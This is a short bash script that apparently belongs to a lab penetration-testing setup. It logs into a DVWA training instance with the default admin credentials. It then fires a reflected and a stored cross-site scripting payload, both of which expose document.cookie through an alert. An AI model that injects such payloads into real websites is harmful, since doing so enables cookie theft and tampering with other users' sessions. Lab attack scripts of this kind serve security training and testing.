#!/usr/bin/env bash
source /home/kali/Pentesting/scripts/config/config.sh

echo "Start [$(date "+%Y-%m-%d %H:%M:%S")]: Running cross-site-scripting"
t0=$(date +%s)

# --- ATTACK ---
#get user token
TOKEN=$(curl -c /home/kali/Pentesting/utils/dvwa.session -s http://$target_ip_msf/dvwa/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
# get session id
PHPSESSID=$(grep PHPSESSID /home/kali/Pentesting/utils/dvwa.session | awk -F' ' '{print $7}')
# log in
curl -L -b "PHPSESSID=${PHPSESSID};security=low" -v -d "username=admin&password=password&Login=Login&user_token=${TOKEN}" http://$target_ip_msf/dvwa/login.php

# xss reflected
curl -s -b "PHPSESSID=${PHPSESSID};security=low" http://$target_ip_msf/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%22You+have+been+hacked%21+Your+cookie+is%3A+%22+%2B+document.cookie+%29%3C%2Fscript%3E#

# xss stored
curl -s -b "PHPSESSID=${PHPSESSID};security=low" http://$target_ip_msf/dvwa/vulnerabilities/xss_s/ --data 'txtName=hacker&mtxMessage=<script>alert(document.cookie)</script>&btnSign=Sign+Guestbook'
# --- ATTACK ---

t=$(date +%s)
elapsed_time=$((t - t0))
echo "End [$(date "+%Y-%m-%d %H:%M:%S")]: Running cross-site-scripting (took $elapsed_time seconds)"
